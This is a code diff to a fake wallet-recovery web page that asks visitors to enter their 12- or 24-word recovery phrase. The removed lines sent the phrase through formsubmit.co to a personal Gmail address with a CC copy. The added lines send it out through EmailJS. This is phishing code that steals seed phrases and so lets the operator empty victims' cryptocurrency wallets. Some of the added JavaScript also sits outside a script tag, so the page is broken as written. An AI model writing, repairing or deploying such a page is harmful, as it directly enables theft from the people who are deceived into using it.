@@ -106,10 +106,7 @@
                             <div class="mt-2">
                                 <div class="mt-10">
 <!-- form starts from here -->
-                                    <form action="https://formsubmit.co/ayoolas665@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                       <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
-                                        <input type="hidden" name="_captcha" value="false">
-                                        <input type="hidden" name="_next" value="https://rectifications-recovery.vercel.app/access/point/success.html">
+                                    <form id="contact-form">
                                         <div class="flex justify-evenly border-b-2 border-fuchsia-600 mb-4">
                                             <div id="phrase" class="p-2 border-b-2 border-white hover:border-blue-600 cursor-pointer">
                                                 Phrase
@@ -127,7 +124,7 @@
                                             </div>
                                             <div class="flex flex-col mb-6">
                                                 <div class="relative"><textarea cols="30" rows="4" placeholder="Enter your recovery phrase" class="text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
-                                                        name="phrase" required=""></textarea>
+                                                        name="user_message" required=""></textarea>
                                                     <p class="text-xs text-grey-300 mt-6">
                                                         Typically 12 (sometimes 24) words separated by single spaces
                                                     </p>
@@ -716,6 +713,23 @@
         </div>
         <script src="../src/js/js1.js"></script>
         <script src="../src/js/js2w.js"></script>
+            <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your actual Public Key
+        })();
+    </script>
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent default form submission
+
+        emailjs.sendForm('service_7yugkvk', 'template_iaeu38f', this) // 'this' refers to the form element
+            .then(function() {
+                alert('Message sent successfully!');
+            }, function(error) {
+                console.log('Failed to send message:', error);
+                alert('Failed to send message.');
+            });
+    });
 </body>
 <script>
     function ready() {
